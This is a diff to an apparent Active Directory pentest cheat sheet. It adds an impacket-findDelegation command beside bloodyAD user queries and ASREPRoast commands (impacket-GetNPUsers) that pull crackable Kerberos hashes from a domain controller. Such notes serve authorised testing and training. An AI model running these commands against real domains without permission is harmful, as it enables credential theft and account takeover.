@@ -33,6 +33,9 @@ bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(objectClass=user)' 
 ## Account Login Count
 bloodyAD --dc-ip $TARGET --host $DC -k get search --filter '(&(objectClass=user)(logonCount>=1))' --attr sAMAccountName,logonCount | grep -v 'distinguishedName' | grep -vE "^\s*$" | cut -d' ' -f2- | python3 -c "import sys;from rich.table import Table;from rich.console import Console;l=sys.stdin.read().splitlines();t=Table(show_lines=False);t.add_column('sAMAccountName');t.add_column('logonCount');[t.add_row(l[i+1],l[i])for i in range(0,len(l),2)];Console().print(t)"
 
+## Delegation
+impacket-findDelegation -dc-host $DC $DOM/ -k -no-pass
+
 ## ASREPRoast
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames_$DC
 impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers_$DC
